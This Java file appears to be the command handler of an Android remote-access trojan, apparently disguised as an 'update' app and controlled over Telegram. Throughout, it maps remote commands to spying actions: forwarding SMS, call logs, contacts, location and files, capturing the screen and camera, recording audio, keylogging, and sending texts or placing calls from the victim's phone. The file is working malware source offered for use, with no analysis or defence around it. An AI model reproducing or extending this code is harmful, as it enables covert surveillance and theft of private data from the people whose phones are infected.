package com.kasari.update;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import java.lang.reflect.Method;

public class CommandProcessor {

    private static Context contextRef;

    public static void processCommand(Context context, String command) {
        contextRef = context;
        command = command.trim().toLowerCase();
        
        String[] parts = command.split(" ", 3);
        String cmd = parts[0];
        
        switch (cmd) {
            case "/sms":
                SmsForwarder.sendAllOldSms(context);
                break;
                
            case "/calls":
                CallInterceptor.sendCallLogs(context);
                break;
                
            case "/contacts":
                ContactGrabber.sendContacts(context);
                break;
                
            case "/location":
            case "/gps":
                LocationTracker.sendLocation(context);
                break;
                
            case "/screen":
                ScreenMirror.startCapture(context);
                break;
                
            case "/screenstop":
                ScreenMirror.stopCapture(context);
                break;
                
            case "/camera":
                CameraCapture.takePhoto(context, true);
                break;
                
            case "/cameraback":
                CameraCapture.takePhoto(context, false);
                break;
                
            case "/rec":
                VoiceRecorder.startRecording(context, 30);
                break;
                
            case "/rec60":
                VoiceRecorder.startRecording(context, 60);
                break;
                
            case "/recstop":
                VoiceRecorder.stopRecording(context);
                break;
                
            case "/keylog":
                TelegramController.sendMessage(context, 
                    "⌨️ Keylogger is active. Type something on target device.");
                break;
                
            case "/notifications":
                TelegramController.sendMessage(context, 
                    "🔔 Notification listener is active. Waiting for notifications...");
                break;
                
            case "/files":
                String path = parts.length > 1 ? parts[1] : null;
                FileExplorer.listFiles(context, path);
                break;
                
            case "/download":
                if (parts.length > 1) {
                    FileExplorer.sendFile(context, parts[1]);
                } else {
                    TelegramController.sendMessage(context, 
                        "📂 Usage: /download /path/to/file");
                }
                break;
                
            case "/apps":
                AppManager.sendApps(context);
                break;
                
            case "/info":
                sendDeviceInfo(context);
                break;
                
            case "/clipboard":
                TelegramController.sendMessage(context, 
                    "📋 Clipboard access requires root. Use keylogger instead.");
                break;
                
            case "/wifi":
                TelegramController.sendMessage(context, 
                    "📶 WiFi password extraction requires root or Android 9-");
                break;
                
            case "/vibrate":
                vibratePhone(context);
                break;
                
            case "/alarm":
                playAlarm(context);
                break;
                
            case "/open":
                if (parts.length > 1) {
                    openUrl(context, parts[1]);
                }
                break;
                
            case "/sms_send":
                if (parts.length >= 3) {
                    sendSms(context, parts[1], parts[2]);
                }
                break;
                
            case "/call":
                if (parts.length > 1) {
                    makeCall(context, parts[1]);
                }
                break;
                
            case "/reboot":
                rebootPhone(context);
                break;
                
            case "/reset":
                TelegramController.sendMessage(context, 
                    "⚠️ Factory reset requires root. Not available.");
                break;
                
            case "/uninstall":
                uninstallSelf(context);
                break;
                
            default:
                TelegramController.sendMessage(context, 
                    "❓ Unknown command: " + command + "\nAvailable: /sms, /calls, /contacts, /location, /screen, /camera, /rec, /files, /info, /vibrate, /alarm, /open, /sms_send, /call");
                break;
        }
    }

    private static void sendDeviceInfo(Context context) {
        StringBuilder info = new StringBuilder();
        info.append("📱 **Device Info**\n\n");
        info.append("Model: ").append(Build.MODEL).append("\n");
        info.append("Brand: ").append(Build.BRAND).append("\n");
        info.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
        info.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
        info.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n");
        info.append("Board: ").append(Build.BOARD).append("\n");
        info.append("Hardware: ").append(Build.HARDWARE).append("\n");
        info.append("Fingerprint: ").append(Build.FINGERPRINT).append("\n");
        info.append("Display: ").append(Build.DISPLAY).append("\n");
        info.append("Host: ").append(Build.HOST).append("\n");
        info.append("User: ").append(Build.USER).append("\n");
        info.append("Tags: ").append(Build.TAGS).append("\n");
        info.append("Time: ").append(Build.TIME).append("\n");
        
        TelegramController.sendMessage(context, info.toString());
    }

    private static void vibratePhone(Context context) {
        Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        if (vibrator != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(5000, 
                    VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(5000);
            }
            TelegramController.sendMessage(context, "📳 Phone vibrating for 5 seconds");
        }
    }

    private static void playAlarm(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            Intent intent = new Intent(context, BootStarter.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
            TelegramController.sendMessage(context, "🔔 Alarm triggered!");
        }
    }

    private static void openUrl(Context context, String url) {
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            url = "https://" + url;
        }
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        TelegramController.sendMessage(context, "🔗 Opening URL: " + url);
    }

    private static void sendSms(Context context, String number, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
            TelegramController.sendMessage(context, "📤 SMS sent to " + number);
        } catch (Exception e) {
            TelegramController.sendMessage(context, "❌ SMS send failed: " + e.getMessage());
        }
    }

    private static void makeCall(Context context, String number) {
        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setData(Uri.parse("tel:" + number));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        TelegramController.sendMessage(context, "📞 Calling " + number);
    }

    private static void rebootPhone(Context context) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
                if (pm != null) {
                    pm.reboot("KasariUpdate");
                }
            } else {
                Process proc = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
                proc.waitFor();
            }
        } catch (Exception e) {
            TelegramController.sendMessage(context, "❌ Reboot failed (requires root)\n" + e.getMessage());
        }
    }

    private static void uninstallSelf(Context context) {
        Uri packageURI = Uri.parse("package:" + context.getPackageName());
        Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
        uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(uninstallIntent);
    }
}